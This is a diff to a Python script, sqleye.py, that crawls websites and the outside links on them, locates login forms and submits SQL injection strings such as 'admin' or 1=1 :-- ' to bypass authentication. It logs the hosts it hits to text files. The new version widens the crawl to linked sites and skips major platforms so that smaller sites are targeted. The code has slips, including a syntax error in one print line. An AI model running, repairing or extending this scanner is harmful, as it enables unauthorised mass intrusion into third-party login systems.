@@ -2,17 +2,18 @@
 import requests 
 from bs4 import BeautifulSoup
 from lxml import html, etree
-import sys
+import sys, fnmatch
 import re
 #use ./sqleye.py website (or ip)
 #will add multi threading and reading from a list of servers
+### v3 
+### add user agent sqli and check all textbox vectors 
 def presentation():
 
     print("[+] # #############################################")
     print("[+] #                                             #")
-    print("[+] #          I spy with my little (SQL)eye      #")
-    print("[+] #                                             #")
-    print("[+] #      ~00xZ-                                 #")
+    print("[+] #          eye spy with my little eye a sqli  #")
+    print("[+] #      ~00xZ-       github.com/00xZ           #")
     print("[+] #                                             #")
     print("[+] # #############################################")
 
@@ -63,9 +64,10 @@ def try_connect(url, USERS, PASSWORDS, title):
 		gethref(url)
 		
 		
-def loginsql(url, user_field, password_field, USERS, PASSWORDS, title, html_contain):
+def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_contain):
 	#print("made it")
-	print("[+] Extracting inputs")
+	print("[!] Extracting inputs")
+	url = (site)
 	#print("here")
 	tree = html.fromstring(html_contain)
 	#print(tree)
@@ -87,7 +89,8 @@ def loginsql(url, user_field, password_field, USERS, PASSWORDS, title, html_cont
 
 		for i, name in enumerate(names):
 			if types[i] != "submit" and name != "submit":
-				print("   [++] > ", str(name), "{" + str(types[i]) + "}")
+				ipnuts = ("   [++] > ", str(name), "{" + str(types[i]) + "}")
+				print(ipnuts)
 			fields = names
 			#print(fields)
 		break
@@ -111,32 +114,58 @@ def loginsql(url, user_field, password_field, USERS, PASSWORDS, title, html_cont
 			fo.write(url + " " +titlez +" with: " +payload+ "\n")
 			fo.close
 		else:
-			print("   Login Fund:NOTVULN")
+			print("   Login Found:NOTVULN")
 			fo = open("LOGIN.txt", "a+")
-			fo.write(serv + "\n")
+			fo.write(url + "\n" + str(ipnuts) + "\n")
 			fo.close
 			gethref(url)
 			pass
 	except:
-		print("it didnt work")
+		print("shit went south")
 		gethref(url)
 		
 		
 
-        
 def title(ip):
 	url = ("http://" + ip + "/")
+	#print("[+] Deep looking: " +url)
+	blacklist = ['*stackoverflow*', '*google*', '*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*']
+	try:
+		rqt = requests.get(url, timeout=6, verify=True)
+		soupr = BeautifulSoup(rqt.content, 'html.parser')
+		
+		for link in soupr.select('a[href*="http"]'):
+			site = (link.get('href'))
+			site = str(site)
+			if any([fnmatch.fnmatch(site, filtering) for filtering in blacklist]):
+				continue
+			print("[!] Found Branch: " site)
+			try:
+				r = requests.get(site, timeout=6, verify=True)
+				soup = BeautifulSoup(r.content, 'lxml')
+				title = (soup.select_one('title').text)
+				USERS = ("admin' or 1=1 :-- ")
+				PASSWORDS = ("1' or 1=1 -- -")
+				user_field = ("username")
+				password_field = ("password")
+				print("[+] Branched scan: " + url + " : " + title + "  [+]")
+				kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
+				loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
+			except:
+				pass
+	except:
+		pass
 	try:
 		r = requests.get(url, timeout=6, verify=True)
 		soup = BeautifulSoup(r.content, 'lxml')
 		title = (soup.select_one('title').text)
-		USERS = ("admin")
+		USERS = ("admin' or 1=1 :-- ")
 		PASSWORDS = ("1' or 1=1 -- -")
 		user_field = ("username")
 		password_field = ("password")
-		print("  [+] " + url + " : " + title + "  [+]")
+		print("[+] " + url + " : " + title + "  [+]")
 		kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
-		loginsql(url, user_field, password_field, USERS, PASSWORDS , title, r.text)
+		loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text)
 	except:
 		gethref(url)
 
@@ -155,4 +184,3 @@ def main():
 			title(ip)
 
 main()
-
